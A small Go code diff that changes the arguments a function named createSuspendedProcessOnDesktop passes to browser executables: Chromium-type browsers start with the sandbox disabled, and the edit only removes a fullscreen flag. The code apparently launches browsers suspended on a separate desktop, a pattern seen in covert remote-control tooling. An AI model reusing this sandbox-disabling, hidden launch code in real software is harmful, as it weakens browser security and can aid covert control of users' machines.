@@ -771,7 +771,7 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName 
 	}
 	baseName := strings.ToLower(filepath.Base(filePath))
 	if browserExes[baseName] {
-		args += " --no-sandbox --allow-no-sandbox-job --disable-gpu --start-fullscreen"
+		args += " --no-sandbox --allow-no-sandbox-job --disable-gpu"
 	} else if baseName == "firefox.exe" {
 		args += " -no-remote -wait-for-browser"
 	}
